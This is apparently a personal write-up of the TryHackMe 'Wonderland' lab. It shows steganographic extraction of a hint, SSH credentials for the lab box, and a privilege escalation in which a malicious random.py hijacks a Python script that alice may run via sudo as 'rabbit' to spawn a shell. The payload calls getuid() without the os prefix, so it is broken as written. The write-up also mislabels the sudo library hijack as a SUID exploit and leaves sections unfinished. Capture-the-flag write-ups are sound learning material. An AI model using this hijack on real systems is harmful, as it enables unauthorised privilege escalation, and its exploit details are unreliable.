---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/wonderland/","tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"],"created":"2026-04-06T13:26:22.348+02:00","updated":"2026-04-06T16:50:24.249+02:00","dg-note-properties":{"tags":["tryhackme","offensivesecurity","ethicalhacking","wonderland","steganography","suid","suid-binaries","ssh"]}}
---

![](/img/user/Attachments/wonderland.png)

----------
## Description


## Recon

As always a full nmap scan is required to discover running services and active ports on the system. 

![](/img/user/Attachments/nmap.png)

Once the running ports and services are discovered we move forward to enumerating the identified services and ports. 

![](/img/user/Attachments/2nmap%201.png)


A not so revealing homepage is seen. Not much to go on. Nothing in the source code either. 

![](/img/user/Attachments/homepage%201.png)

The room says to follow the rabbit. Following the endpoint `/img` shows 3 images. 1 of them being a rabbit. I strongly suspect it being a steganography challenge. Let's find an appropiate tool.

---------

## Enumeration

Let's acquire steghide from via apt and download the image from the endpoint to local machine.

```
# download the steganography tool
sudo apt install steghide -y

# acquire the white rabbit image 
wget <http://TARGET/img/<IMAGE>>

```

![](/img/user/Attachments/down_image.png)

Using the help command it shows that information can be acquired from the image with the **info** flag. 

`steghide --info <IMAGE>`

![](/img/user/Attachments/steghide1.png)

Running the command shows that this image is indeed hiding valuable information and there is an embedded file `hint.txt` encrypted with `rijndael-128, cbc` and a passphrase is required to decompress this image to acquire the file. 

## Enumeration #2 

Looping back to the **enumeration** phase since the `hint.txt` reveals an endpoint. Exploring it is clear that one must really follow the rabbit.

`/r/`

![](/img/user/Attachments/r-e.png)

`/ra/b/b/i/t`

![](/img/user/Attachments/rabbit-e.png)

Looking to the source code might be some credentials.
![](/img/user/Attachments/ssh-creds.png)

**Credentials**
`alice:HowDothTheLittleCrocodileImproveHisShiningTail`

![](/img/user/Attachments/ssh.png)

Trying them out sure enough grants access to the SSH box as alice. 

> Moving on to Post-exploitation from here

--------
## Exploitation

### Extracting the hint.txt using Steganography

Lets acquire a tool to help discover the passphrase. 

`sudo apt install stegseek -y`

![](/img/user/Attachments/stegseek.png)

Running the tool to discover the passphrase reveals that there is none. Let's extract the image.

Extracting the file from the image with the confirmed by `""` empty password is a success. The embedded file is written to disk and reveals a hint.

`steghide --extract -sf white_rabbit_1.jpg -p ""`

![](/img/user/Attachments/hint.txt.png)

Once again the room states to follow the rabbit. 

> Moving to Enumeration #2 from here

------

## Post-exploitation

![](/img/user/Attachments/users-on-ssytem.png)

There are 4 existing users on the system

```
# Listing what is in Alice's home directory
-rw------- 1 root root   66 May 25  2020 root.txt  
-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
```

There is a root.txt which obviously is unreadable as the user alice. The room states a `user.txt` file is present. Furthermore there is a poem with nothing valuable saved in a .py file. 

**Attack Path**
Running `sudo -l` reveals valuable intel. Alice is able to execute the useless **.py** poem as the other user **rabbit** without the need for his password. Checking the content of the file out it is importing the library random. Lets exploit that.

### Exploiting SUID-binaries 

**Payload**
`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

> Note it is required to specify the full path when exploiting this suid binary vulnerability

```
# malicious random.py library
import os
import pty
os.setuid(getuid())
pty.spawn("/bin/bash")
```

------

### Moving on as Rabbit

![](/img/user/Attachments/rabbitshell.png)

Sure enough the shell to **rabbit** is a success.


## Pwnage

First flag: 
Second flag: 

## Attack Pattern Analysis (APA)